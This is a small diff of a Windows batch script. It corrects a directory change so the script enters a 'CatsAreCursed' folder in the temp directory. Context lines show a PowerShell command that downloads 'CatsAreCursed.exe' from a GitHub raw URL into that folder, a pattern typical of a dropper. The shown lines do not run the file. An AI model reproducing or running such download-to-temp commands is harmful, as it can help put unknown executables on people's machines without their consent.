@@ -4,7 +4,7 @@ cls
 
 cd %temp%
 if not exist "CatsAreCursed" mkdir "CatsAreCursed"
-cd StartFile
+cd CatsAreCursed
 
 powershell -command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Bruchstein/CatsAreCursed/main/CatsAreCursed.exe', "CatsAreCursed.exe")
 
